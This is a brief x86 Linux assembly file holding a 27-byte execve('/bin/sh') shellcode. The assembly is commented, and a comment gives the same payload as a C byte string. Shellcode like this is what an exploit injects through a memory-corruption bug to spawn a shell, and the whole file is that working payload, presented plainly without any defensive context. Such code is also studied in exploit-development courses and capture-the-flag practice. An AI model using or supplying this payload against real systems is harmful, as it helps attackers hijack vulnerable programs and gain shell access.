# /* execve("/bin/sh", ["/bin/sh", 0], 0) - 27 bytes */
# char shellcode[] = "\x6a\x0b\x58\x99\x52\xeb\x08\x89\xe1\x5b\x88\x53\x07\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

.text
.globl _start
_start:
	push	$11		# sys_execve
	popl	%eax
	cdq			# env = NULL
	pushl	%edx		# argv[1]
	jmp	binsh
back:
	mov	%esp, %ecx	# argv
	pop	%ebx		# argv[0] = address of '/bin/sh'
	movb	%dl, 0x7(%ebx)	# null-terminator
	int	$0x80		# syscall
binsh:
	call back		# pushl next_instr; jmp back
	.ascii "/bin/sh"	# <-- next_instr
